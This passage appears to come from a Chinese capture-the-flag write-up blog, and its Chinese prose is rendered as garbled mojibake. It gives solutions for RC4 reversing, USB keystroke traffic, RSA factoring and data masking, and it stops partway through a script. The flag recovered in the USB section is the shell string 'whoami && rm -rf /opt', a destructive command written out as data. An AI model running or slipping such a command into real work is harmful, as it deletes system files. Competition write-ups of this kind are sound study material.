src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744855371495-4de55fd3-bf10-424f-aa00-1d2fa0abd223.png" class="" title="img"><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744855321134-ed6e7f5b-9da7-4db7-b4bd-6a9852a352f9.png" class="" title="img"><p>è„±å£³ä¹‹åå‘ç°æ˜¯rc4</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744855416132-6212feb3-55bd-4c48-aeab-571876810707.png" class="" title="img"><p>initæœ‰é­”æ”¹</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744855425584-2f323cef-cfa9-49db-ba66-bb6cb40c6bb9.png" class="" title="img"><p>æŒ‰ä¼ªcä¸€ç›´å¾—ä¸åˆ°æ­£ç¡®çš„Sç›’ï¼Œç›´æ¥æå–åˆå§‹åŒ–åçš„sç›’</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744855303794-73ed07a8-88fe-472d-8cd8-6a8821ae59b5.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    <span class="hljs-comment"># S = list(range(256))</span><br>    <span class="hljs-comment"># j = 0</span><br>    out = []<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        tmp=S[i]<br>        S[i] =(S[i] + S[j])%<span class="hljs-number">256</span><br>        S[j] =(tmp + S[j])%<span class="hljs-number">256</span><br><br>    S=[]<br>    S=[<span class="hljs-number">0x4E</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xFF</span>,<br>  <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x9C</span>,<br>  <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xE5</span>,<br>  <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xAA</span>,<br>  <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xB7</span>,<br>  <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xCE</span>,<br>  <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xD5</span>,<br>  <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xF7</span>,<br>  <span class="hljs-number">0x84</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x75</span>,<br>  <span class="hljs-number">0x71</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x31</span>,<br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x50</span>,<br>  <span class="hljs-number">0x85</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD4</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x75</span>,<br>  <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xA0</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xDE</span>,<br>  <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x32</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xEE</span>,<br>  <span class="hljs-number">0xED</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x13</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xBB</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xBA</span>,<br>  <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x24</span>,<br>  <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x8E</span>,<br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xF6</span>,<br>  <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xC6</span>]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        char = char + S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        char%=<span class="hljs-number">256</span><br>        out.append(char)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x64</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xE9</span>,<br>  <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xF8</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xE6</span>,<br>  <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7F</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br>key = <span class="hljs-string">b&#x27;rc4IsEasy&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#b&#x27;2404c9b8af2dd18f92dd9018c85f76fe&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="usb"><a href="#usb" class="headerlink" title="usb"></a>usb</h2><p>ç»å…¸usbæµé‡</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744883133737-7f7301bc-dda8-49e8-b52d-500ba10b172a.png" class="" title="img"><p>è¿‡æ»¤hid dataåˆ—ï¼Œåé¢è·‘è„šæœ¬æå–</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744872536742-804d5a1d-c2ba-4ac6-bb54-b720a8151f8f.png" class="" title="img"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;<span class="hljs-built_in">whoami</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf /opt&#125;<br></code></pre></td></tr></table></figure><h2 id="easymodbus-3"><a href="#easymodbus-3" class="headerlink" title="easymodbus-3"></a>easymodbus-3</h2><p>æ¢å¤ä¸äº†ç¬¦å·è¡¨ï¼Œä¹Ÿæ²¡æ‰¾åˆ°ç½‘ä¸Šç±»ä¼¼çš„é¢˜</p><p>&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ï¼Œå¯èƒ½è¦å‘é€ç¬¦åˆæ ¼å¼çš„æ•°æ®å†getshell</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NumberTheory"><a href="#NumberTheory" class="headerlink" title="NumberTheory"></a>NumberTheory</h2><p>yafuåˆ†è§£å‘ç°hintèƒ½è¢«233æ•´é™¤ï¼Œç»è¿‡å°è¯•ä¹‹åå‘ç°å¯ä»¥ç”¨è´¹é©¬å°å®šç†</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744940695110-ead57687-804f-47e2-878f-389666c43846.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><br>n  = <span class="hljs-number">113310007043671810845854958178261892350466329031075849658400622797220639822165853920670375240421584770086737199174179404426269461807205919265215015318558583279307342189066142674684812629436201594710931246023579402265860654799773575870718232197419475376859857859160478517321102794376573133320398421013885294803</span>  <span class="hljs-comment"># n</span><br>c  = <span class="hljs-number">71140184512977657248678802858923889906469994653365050397942639686285067049311597229075083243014006139628135512648917088910957708595173169740778384396383007676160125041429483214711040860094456744628950189892189206308633008723823236088821678663574778449944147445444557428696970338207423613161971095287158528268</span>  <span class="hljs-comment"># c</span><br>hint = <span class="hljs-number">304302625376181653586904104401793052942691958380766622476796502085769101118223423483198426870687288772995446524917404481734386549400612667029785738864459729312716240418284186683690152478372081937338184159203750009565388703480806423176123558900518577576731229725343401015296144240503499943327828404875279740222104515371853890423856666710430710428991178833598803175224026696772717334264841725910496575249477684269365734094608409667005577061258227602330654989600297462</span>  <span class="hljs-comment"># hint</span><br><br>e = <span class="hljs-number">65537</span><br><br>L = hint // <span class="hljs-number">233</span><br>p = gcd(<span class="hljs-built_in">pow</span>(c, L, n) - <span class="hljs-number">1</span>, n)<br>q = n // p<br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d  = inverse(e, phi)<br>m  = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#flag&#123;d0bafb7185f2acfd371c566cbae25af9&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æ•°æ®å®‰å…¨"><a href="#æ•°æ®å®‰å…¨" class="headerlink" title="æ•°æ®å®‰å…¨"></a>æ•°æ®å®‰å…¨</h1><p>ç‹ ç‹ ç ´é˜²</p><h2 id="æ•°æ®è„±æ•-3"><a href="#æ•°æ®è„±æ•-3" class="headerlink" title="æ•°æ®è„±æ•-3"></a>æ•°æ®è„±æ•-3</h2><p>ä¸ºäº†æŠµæŠ—é»‘å®¢æ”»å‡»å¯¼è‡´æ•°æ®æ‹–åº“ç­‰é—®é¢˜ï¼Œéœ€è¦å°†æ•æ„Ÿæ•°æ®è¯†åˆ«å¹¶è„±æ•å­˜å‚¨æˆâ¼€ä¸ªè¡¨ã€‚ç»™å®šè„±æ•ç®—æ³•é€»è¾‘ï¼Œè¦æ±‚é€‰â¼¿â½£æˆè„±æ•åçš„æ•°æ®è¡¨æ•°æ®ï¼ˆæ‰€æœ‰æ•°æ®å‡ä¸ºéšæœºâ½£æˆï¼Œä¸ç°å®ä¸–ç•Œâ½†ä»»ä½•è”ç³»ï¼‰ã€‚ä¸ºäº†é˜²â½Œâ¼€äº›éšç§æ•°æ®æ³„æ¼ï¼Œç°éœ€è¦å¯¹è¯¥æ•°æ®è¡¨è¿›â¾è„±æ•æ“ä½œï¼Œè¯·æŒ‰ç…§æŒ‡å®šè¦æ±‚å¯¹å„å­—æ®µè¿›â¾è„±æ•å¤„ç†ï¼Œå¹¶æŒ‰ç…§å…ˆè¡Œååˆ—æ‹¼æ¥å­—ç¬¦ä¸²ï¼ˆä¸åŒ…å«æ ‡é¢˜è¡Œï¼‰ï¼Œå¯¹æ­¤å­—ç¬¦ä¸²è¿›è¡Œmd5è®¡ç®—ï¼Œå¾—åˆ°ç­”æ¡ˆã€‚ <strong>è„±æ•è¦æ±‚ï¼š</strong> - <strong>ç¼–å·</strong>ï¼šâ½†éœ€è„±æ•ã€‚ - <strong>å§“å</strong>ï¼šâ¼†å­—å§“åå¯¹æœ€åâ¼€ä½å­—ä½¿â½¤ * è¿›â¾æ›¿æ¢ï¼Œä¸‰å­—å§“åå¯¹ä¸­é—´â¼€ä½å­—ä½¿â½¤ * è¿›â¾æ›¿æ¢ï¼Œå››å­—å§“åå¯¹ä¸­é—´ä¸¤ä½å­—ä½¿â½¤ * è¿›â¾æ›¿æ¢ã€‚ - <strong>æ‰‹æœºå·</strong>ï¼šè¯·å¯¹ä¸­é—´äº”ä½ä¿¡æ¯ä½¿â½¤ * è¿›â¾æ›¿æ¢ã€‚ - <strong>èº«ä»½è¯å·ç </strong>ï¼šè¯·å¯¹é™¤äº†å‰6ä½ä¿¡æ¯ä½¿â½¤ * è¿›â¾æ›¿æ¢ã€‚ - <strong>é“¶â¾å¡</strong>ï¼šè¯·å¯¹å‰å››ä½å’Œååä½ä¿¡æ¯ä½¿â½¤ * è¿›â¾æ›¿æ¢ã€‚ - <strong>Email</strong>ï¼šè¯·å¯¹å­—ç¬¦ @ å‰é™¤ . å¤–çš„å­—ç¬¦ä½¿â½¤ * è¿›â¾æ›¿æ¢ã€‚ - <strong>æ€§åˆ«</strong>ï¼šæ›¿æ¢æˆæœªçŸ¥ã€‚ - <strong>å¾®ä¿¡å·</strong>ï¼šè¯·å¯¹ä¸ºå­—ç¬¦çš„ä¿¡æ¯ä½¿ç”¨ * è¿›è¡Œæ›¿æ¢ã€‚</p><p>æç¤ºï¼š000001,ç« ä¸‰,17955640890,319540678369985756,3612632840753013460,<a href="mailto:&#x62;&#x76;&#x73;&#x66;&#x76;&#x62;&#64;&#x6f;&#x75;&#x74;&#x6c;&#111;&#x6f;&#107;&#x2e;&#x63;&#111;&#109;">&#x62;&#x76;&#x73;&#x66;&#x76;&#x62;&#64;&#x6f;&#x75;&#x74;&#x6c;&#111;&#x6f;&#107;&#x2e;&#x63;&#111;&#109;</a>,å¥³,bcv6349</p><p>000001,ç« *,179<em><strong><strong>890,319540</strong></strong></em><em><strong><strong><strong>,<strong><strong>63284</strong></strong></strong></strong></strong>,</em><em><strong><strong>@outlook.com,æœªçŸ¥,</strong></strong></em>**</p><p>åŠ é€—å·å’Œä¸åŠ é€—å·éƒ½è¯•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># è„±æ•è§„åˆ™å‡½æ•°</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_name</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;å§“åè„±æ•è§„åˆ™ï¼šäºŒå­—å§“åå¯¹æœ€åä¸€ä½å­—ä½¿ç”¨ * æ›¿æ¢ï¼Œä¸‰å­—å§“åå¯¹ä¸­é—´ä¸€ä½å­—ä½¿ç”¨ * æ›¿æ¢ï¼Œå››å­—å§“åå¯¹ä¸­é—´ä¸¤ä½å­—ä½¿ç”¨ * æ›¿æ¢&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> name[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> name[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span> + name[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> name[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-string">&quot;*&quot;</span> + name[<span class="hljs-number">3</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> name<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_phone</span>(<span class="hljs-params">phone</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ‰‹æœºå·è„±æ•è§„åˆ™ï¼šå¯¹ä¸­é—´äº”ä½ä¿¡æ¯ä½¿ç”¨ * è¿›è¡Œæ›¿æ¢&quot;&quot;&quot;</span><br>    phone = <span class="hljs-built_in">str</span>(phone).strip()  <span class="hljs-comment"># ç¡®ä¿æ²¡æœ‰ç©ºæ ¼</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(phone) == <span class="hljs-number">11</span>:  <span class="hljs-comment"># å‡è®¾æ‰‹æœºå·é•¿åº¦ä¸º11</span><br>        <span class="hljs-keyword">return</span> phone[:<span class="hljs-number">3</span>] + <span class="hljs-string">&quot;*****&quot;</span> + phone[<span class="hljs-number">8</span>:]<br>    <span class="hljs-keyword">return</span> phone  <span class="hljs-comment"># å¦‚æœé•¿åº¦ä¸å¯¹ï¼Œç›´æ¥è¿”å›åŸå§‹æ‰‹æœºå·</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_id</span>(<span class="hljs-params">id_number</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;èº«ä»½è¯å·è„±æ•è§„åˆ™ï¼šä¿ç•™å‰å…­ä½ï¼Œå‰©ä¸‹çš„ç”¨ * æ›¿ä»£&quot;&quot;&quot;</span><br>    id_number = <span class="hljs-built_in">str</span>(id_number).strip()  <span class="hljs-comment"># å»é™¤ç©ºæ ¼</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(id_number) &gt;= <span class="hljs-number">6</span>:<br>        <span class="hljs-keyword">return</span> id_number[:<span class="hljs-number">6</span>] + <span class="hljs-string">&quot;**************&quot;</span><br>    <span class="hljs-keyword">return</span> id_number  <span class="hljs-comment"># å¦‚æœé•¿åº¦ä¸è¶³6ä½ï¼Œç›´æ¥è¿”å›</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_bank_card</span>(<span class="hljs-params">bank_card</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;é“¶è¡Œå¡å·è„±æ•è§„åˆ™ï¼šå‰å››ä½å’Œååä½ä¿¡æ¯ä½¿ç”¨ * æ›¿æ¢&quot;&quot;&quot;</span><br>    bank_card = <span class="hljs-built_in">str</span>(bank_card).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(bank_card) &gt;= <span class="hljs-number">14</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;****&quot;</span> + bank_card[<span class="hljs-number">4</span>:-<span class="hljs-number">10</span>] + <span 